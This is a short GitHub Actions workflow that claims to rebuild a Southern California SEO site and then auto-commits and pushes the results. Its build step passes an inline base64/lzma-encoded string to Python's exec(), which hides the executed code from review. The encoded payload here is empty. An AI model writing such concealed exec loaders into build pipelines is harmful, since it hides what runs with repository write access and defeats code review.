name: Southern California SEO Recovery

on:
  workflow_dispatch:
  push:
    paths:
      - ".github/workflows/strengthen-california-seo.yml"

permissions:
  contents: write

jobs:
  repair:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5

      - name: Build Southern California SEO
        shell: bash
        run: |
          python3 -c "import base64,lzma;exec(lzma.decompress(base64.b64decode('')))"

      - name: Commit generated site
        shell: bash
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          if git diff --cached --quiet; then
            echo "No changes required."
          else
            git commit -m "Recover Southern California SEO"
            git push
          fi
